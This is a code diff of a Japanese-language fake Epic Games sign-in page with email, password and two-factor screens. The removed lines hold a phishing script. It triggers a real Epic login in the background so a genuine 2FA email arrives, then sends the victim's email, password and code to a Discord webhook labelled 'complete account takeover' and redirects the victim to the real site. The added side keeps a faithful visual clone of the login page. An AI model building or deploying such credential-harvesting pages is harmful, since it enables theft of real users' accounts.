@@ -5,144 +5,630 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Epic Gamesにサインインする</title>
     <style>
-        /* ← ここに最初にあなたが貼った超長いCSSを全部そのまま貼り付けてください（省略不可） */
-        /* 見た目を100%公式と同じにするため、1文字も削らないで全部コピー */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'BrutoSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            background: #0f0f10;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            color: #f5f5f5;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 32px;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        .console-section {
+            margin-bottom: 24px;
+        }
+
+        .console-btn {
+            width: 100%;
+            padding: 13px 16px;
+            margin-bottom: 8px;
+            background: #2a2a2e;
+            border: 1px solid #3a3a3e;
+            border-radius: 3px;
+            color: #f5f5f5;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.15s ease;
+            position: relative;
+        }
+
+        .console-btn:hover {
+            background: #323236;
+            border-color: #4a4a4e;
+        }
+
+        .console-btn:active {
+            background: #1f1f23;
+        }
+
+        .console-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .playstation {
+            background: #003087;
+        }
+
+        .xbox {
+            background: #0e7a0d;
+        }
+
+        .nintendo {
+            background: #e60012;
+        }
+
+        .section-title {
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 12px;
+            font-weight: 400;
+        }
+
+        .email-input, .password-input {
+            width: 100%;
+            padding: 13px 14px;
+            background: #2a2a2e;
+            border: 1px solid #3a3a3e;
+            border-radius: 3px;
+            color: #f5f5f5;
+            font-size: 14px;
+            margin-bottom: 12px;
+            transition: all 0.15s ease;
+            font-family: inherit;
+        }
+
+        .email-input:focus, .password-input:focus {
+            outline: none;
+            border-color: #0078f2;
+            background: #323236;
+        }
+
+        .email-input::placeholder, .password-input::placeholder {
+            color: #6b7280;
+        }
+
+        .continue-btn, .signin-btn {
+            width: 100%;
+            padding: 13px;
+            background: #0078f2;
+            border: none;
+            border-radius: 3px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            margin-bottom: 16px;
+            letter-spacing: 0.2px;
+        }
+
+        .continue-btn:hover, .signin-btn:hover {
+            background: #0066d6;
+        }
+
+        .continue-btn:active, .signin-btn:active {
+            background: #0052b0;
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        .signup-link {
+            color: #0078f2;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 32px 0 24px 0;
+            font-size: 13px;
+            color: #6b7280;
+            font-weight: 400;
+        }
+
+        .social-section {
+            margin-bottom: 32px;
+        }
+
+        .social-btn {
+            width: 100%;
+            padding: 13px 16px;
+            margin-bottom: 8px;
+            background: #2a2a2e;
+            border: 1px solid #3a3a3e;
+            border-radius: 3px;
+            color: #f5f5f5;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.15s ease;
+        }
+
+        .social-btn:hover {
+            background: #323236;
+            border-color: #4a4a4e;
+        }
+
+        .social-btn:active {
+            background: #1f1f23;
+        }
+
+        .social-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .google-icon {
+            background: #ffffff;
+            color: #4285f4;
+            font-family: 'Product Sans', Arial, sans-serif;
+        }
+
+        .steam-icon {
+            background: #171a21;
+            color: #c7d5e0;
+        }
+
+        .disney-icon {
+            background: #0063e5;
+            color: #ffffff;
+            font-size: 14px;
+        }
+
+        .apple-icon {
+            background: #000000;
+            color: #ffffff;
+            font-size: 20px;
+        }
+
+        .facebook-icon {
+            background: #1877f2;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .lego-icon {
+            background: #ffcb05;
+            color: #c4171e;
+            font-weight: 900;
+            font-size: 16px;
+        }
+
+        .help-links {
+            text-align: center;
+            margin-top: 32px;
+        }
+
+        .help-link {
+            color: #0078f2;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .privacy-link {
+            color: #6b7280;
+            font-weight: 400;
+        }
+
+        .privacy-link:hover {
+            color: #9ca3af;
+        }
+
+        /* Password page styles */
+        .back-arrow {
+            color: #9ca3af;
+            font-size: 20px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .back-arrow:hover {
+            color: #f5f5f5;
+        }
+
+        .password-title {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            color: #f5f5f5;
+        }
+
+        .user-email {
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 24px;
+        }
+
+        .password-label {
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 8px;
+            display: block;
+            font-weight: 400;
+        }
+
+        .password-input-wrapper {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .password-input {
+            padding-right: 45px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            color: #0078f2;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            margin-top: 2px;
+            cursor: pointer;
+        }
+
+        .checkbox-label {
+            font-size: 12px;
+            color: #9ca3af;
+            line-height: 1.4;
+            cursor: pointer;
+        }
+
+        .checkbox-label a {
+            color: #0078f2;
+            text-decoration: none;
+        }
+
+        .checkbox-label a:hover {
+            text-decoration: underline;
+        }
+
+        /* Verification page styles */
+        .verification-options {
+            margin-bottom: 32px;
+        }
+
+        .verification-btn {
+            width: 100%;
+            padding: 16px 18px;
+            margin-bottom: 12px;
+            background: #2a2a2e;
+            border: 1px solid #3a3a3e;
+            border-radius: 3px;
+            color: #f5f5f5;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.15s ease;
+        }
+
+        .verification-btn:hover {
+            background: #323236;
+            border-color: #4a4a4e;
+        }
+
+        .verification-btn:active {
+            background: #1f1f23;
+        }
+
+        .verification-icon {
+            font-size: 22px;
+            flex-shrink: 0;
+        }
+
+        .verification-btn span:nth-child(2) {
+            flex-grow: 1;
+            text-align: left;
+        }
+
+        .arrow-right {
+            color: #9ca3af;
+            font-size: 24px;
+            font-weight: 300;
+        }
     </style>
 </head>
 <body>
     <div class="login-container">
-
-        <!-- ① メール入力ページ -->
+        <!-- Page 1: Email Login -->
         <div id="emailPage" class="page active">
             <h1 class="title">Epic Gamesにサインインする</h1>
-            <p class="subtitle">コンソールのみでプレイしましたか？サインインして進行状況や購入物にアクセスしてください。</p>
-            <div class="console-section">…（省略、前のまま）…</div>
-            <div class="section-title">PCまたはモバイルでプレイしましたか？</div>
+            <p class="subtitle">コンソールのみでプレイしましたか?サインインして進行状況や購入物にアクセスしてください。</p>
+
+            <div class="console-section">
+                <button class="console-btn">
+                    <div class="console-icon playstation">PS</div>
+                    PlayStation™Network
+                </button>
+                <button class="console-btn">
+                    <div class="console-icon xbox">X</div>
+                    Xbox ネットワーク
+                </button>
+                <button class="console-btn">
+                    <div class="console-icon nintendo">N</div>
+                    ニンテンドーアカウント
+                </button>
+            </div>
+
+            <div class="section-title">PCまたはモバイルでプレイしましたか?</div>
+            
             <form id="emailForm">
-                <input type="email" id="emailInput" class="email-input" placeholder="メールでサインインする" required>
+                <input type="email" id="emailInput" class="email-input" placeholder="メールでサインインする">
                 <button type="submit" class="continue-btn">続ける</button>
             </form>
-            …（中略、前のHTML全部そのまま）…
+
+            <div class="signup-text">
+                初めてですか? <a href="#" class="signup-link">アカウントを作成</a>
+            </div>
+
+            <div class="divider">別の方法でサインイン</div>
+
+            <div class="social-section">
+                <button class="social-btn">
+                    <div class="social-icon google-icon">G</div>
+                    Google
+                </button>
+                <button class="social-btn">
+                    <div class="social-icon steam-icon">■</div>
+                    Steam
+                </button>
+                <button class="social-btn">
+                    <div class="social-icon disney-icon">D+</div>
+                    MyDisney(マイディズニー)アカウント
+                </button>
+                <button class="social-btn">
+                    <div class="social-icon apple-icon"></div>
+                    Appleでサインインする
+                </button>
+                <button class="social-btn">
+                    <div class="social-icon facebook-icon">f</div>
+                    Facebook
+                </button>
+                <button class="social-btn">
+                    <div class="social-icon lego-icon">L</div>
+                    レゴアカウント
+                </button>
+            </div>
+
+            <div class="help-links">
+                <a href="#" class="help-link">サインインでお困りですか?</a>
+                <a href="#" class="help-link privacy-link">プライバシーポリシー</a>
+            </div>
         </div>
 
-        <!-- ② パスワード入力ページ -->
+        <!-- Page 2: Password Entry -->
         <div id="passwordPage" class="page">
             <span class="back-arrow" id="backBtn">←</span>
             <h2 class="password-title">パスワードを入力</h2>
             <p class="user-email" id="displayEmail"></p>
+
             <form id="passwordForm">
                 <label class="password-label">パスワード</label>
                 <div class="password-input-wrapper">
-                    <input type="password" id="passwordInput" class="password-input" required>
-                    <span class="eye-icon">Show</span>
+                    <input type="password" id="passwordInput" class="password-input">
+                    <span class="eye-icon">👁</span>
                 </div>
+                
                 <a href="#" class="forgot-password">パスワードを忘れた場合</a>
-                <div class="checkbox-wrapper">…（前のまま）…</div>
+
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="loginCheckbox">
+                    <label for="loginCheckbox" class="checkbox-label">
+                        Epic Gamesを使用してログインするゲームやアプリにログインしたままにする(<a href="#">オプション</a>)
+                    </label>
+                </div>
+
                 <button type="submit" class="signin-btn">サインイン</button>
             </form>
-        </div>
 
-        <!-- ③ 認証方法選択ページ -->
-        <div id="verificationPage" class="page">
-            <span class="back-arrow" id="backBtn2">←</span>
-            <h2 class="password-title">認証方法を選択する</h2>
-            <p class="subtitle" style="text-align:left;margin-bottom:24px;">本人確認を行うための認証方法を選択してください。</p>
-            <div class="verification-options">
-                <button class="verification-btn"><div class="verification-icon">Phone</div><span>認証アプリ</span><span class="arrow-right">→</span></button>
-                <button class="verification-btn" id="email2fa"><div class="verification-icon">Email</div><span>メールアドレスの認証</span><span class="arrow-right">→</span></button>
-                <button class="verification-btn"><div class="verification-icon">Key</div><span>バックアップリカバリコード</span><span class="arrow-right">→</span></button>
+            <div class="help-links">
+                <a href="#" class="help-link privacy-link">プライバシーポリシー</a>
             </div>
         </div>
 
-        <!-- ④ 認証コード入力ページ（最終段階） -->
-        <div id="codePage" class="page">
-            <span class="back-arrow" id="backBtn3">←</span>
-            <h2 class="password-title">認証コードを入力</h2>
-            <p class="subtitle" style="text-align:left;" id="codeText">メールに届いた6桁のコードを入力してください</p>
-            <form id="codeForm">
-                <input type="text" id="codeInput" class="email-input" placeholder="123456" maxlength="6" autocomplete="off">
-                <button type="submit" class="continue-btn">確認して続ける</button>
-            </form>
-        </div>
+        <!-- Page 3: Verification Method Selection -->
+        <div id="verificationPage" class="page">
+            <span class="back-arrow" id="backBtn2">←</span>
+            <h2 class="password-title">認証方法を選択する</h2>
+            <p class="subtitle" style="text-align: left; margin-bottom: 24px;">本人確認を行うための認証方法を選択してください。</p>
 
+            <div class="verification-options">
+                <button class="verification-btn">
+                    <div class="verification-icon">📱</div>
+                    <span>認証アプリ</span>
+                    <span class="arrow-right">›</span>
+                </button>
+                <button class="verification-btn">
+                    <div class="verification-icon">✉️</div>
+                    <span>メールアドレスの認証</span>
+                    <span class="arrow-right">›</span>
+                </button>
+                <button class="verification-btn">
+                    <div class="verification-icon">🔑</div>
+                    <span>バックアップリカバリコード</span>
+                    <span class="arrow-right">›</span>
+                </button>
+            </div>
+
+            <div class="help-links">
+                <a href="#" class="help-link privacy-link">プライバシーポリシー</a>
+            </div>
+        </div>
     </div>
 
     <script>
-        // ======== ここだけ変更すれば即稼働 ========
-        const WEBHOOK = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";
+        const emailPage = document.getElementById('emailPage');
+        const passwordPage = document.getElementById('passwordPage');
+        const verificationPage = document.getElementById('verificationPage');
+        const emailForm = document.getElementById('emailForm');
+        const emailInput = document.getElementById('emailInput');
+        const displayEmail = document.getElementById('displayEmail');
+        const backBtn = document.getElementById('backBtn');
+        const backBtn2 = document.getElementById('backBtn2');
+        const passwordForm = document.getElementById('passwordForm');
 
-        let email = "", pass = "";
-
-        // ① メール取得
-        document.getElementById('emailForm').onsubmit = e => {
+        // Email form submission
+        emailForm.addEventListener('submit', function(e) {
             e.preventDefault();
-            email = document.getElementById('emailInput').value.trim();
-            if(email){
-                document.getElementById('displayEmail').textContent = email + 'でサインインしています。';
-                document.getElementById('emailPage').classList.remove('active');
-                document.getElementById('passwordPage').classList.add('active');
+            const email = emailInput.value.trim();
+            if (email) {
+                displayEmail.textContent = email + 'でサインインしています。';
+                emailPage.classList.remove('active');
+                passwordPage.classList.add('active');
             }
-        };
+        });
 
-        // ② パスワード取得 → 裏で本物Epicに自動ログイン試行
-        document.getElementById('passwordForm').onsubmit = async e => {
+        // Back button from password page
+        backBtn.addEventListener('click', function() {
+            passwordPage.classList.remove('active');
+            emailPage.classList.add('active');
+        });
+
+        // Back button from verification page
+        backBtn2.addEventListener('click', function() {
+            verificationPage.classList.remove('active');
+            passwordPage.classList.add('active');
+        });
+
+        // Password form submission
+        passwordForm.addEventListener('submit', function(e) {
             e.preventDefault();
-            pass = document.getElementById('passwordInput').value;
-            if(pass){
-                document.getElementById('passwordPage').classList.remove('active');
-                document.getElementById('verificationPage').classList.add('active');
-
-                // 裏で本物に投げる（2FAメールが本当に届く）
-                fetch('https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Authorization': 'basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y='
-                    },
-                    body: new URLSearchParams({
-                        grant_type: 'password',
-                        username: email,
-                        password: pass
-                    })
-                });
+            const password = document.getElementById('passwordInput').value;
+            if (password) {
+                passwordPage.classList.remove('active');
+                verificationPage.classList.add('active');
             }
-        };
+        });
 
-        // ③ 「メールアドレスの認証」を押すとコード入力画面へ
-        document.getElementById('email2fa').onclick = () => {
-            document.getElementById('verificationPage').classList.remove('active');
-            document.getElementById('codeText').textContent = email + " 宛に送信した6桁のコードを入力してください";
-            document.getElementById('codePage').classList.add('active');
-        };
+        // Console and social buttons do nothing
+        document.querySelectorAll('.console-btn, .social-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
 
-        // ④ コード入力 → Discordにだけ送信（本物Epicには送らない）
-        document.getElementById('codeForm').onsubmit = async e => {
-            e.preventDefault();
-            const code = document.getElementById('codeInput').value;
-            if(code.length === 6){
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "Fortnite/Epic アカウント完全奪取",
-                            color: 15158332,
-                            fields: [
-                                {name: "メール", value: value: email},
-                                {name: "パスワード", value: pass},
-                                {name: "認証コード", value: `**${code}**`}
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-                alert("ログインに失敗しました。もう一度お試しください。");
-                setTimeout(() => location.href = "https://www.epicgames.com/", 1500);
+        // Verification buttons do nothing
+        document.querySelectorAll('.verification-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+            });
+        });
+
+        // Eye icon toggle
+        document.querySelector('.eye-icon').addEventListener('click', function() {
+            const passwordInput = document.getElementById('passwordInput');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
             }
-        };
-
-        // 戻るボタンなど
-        document.querySelectorAll('.back-arrow').forEach(b => b.onclick = () => history.back());
+        });
     </script>
 </body>
 </html>
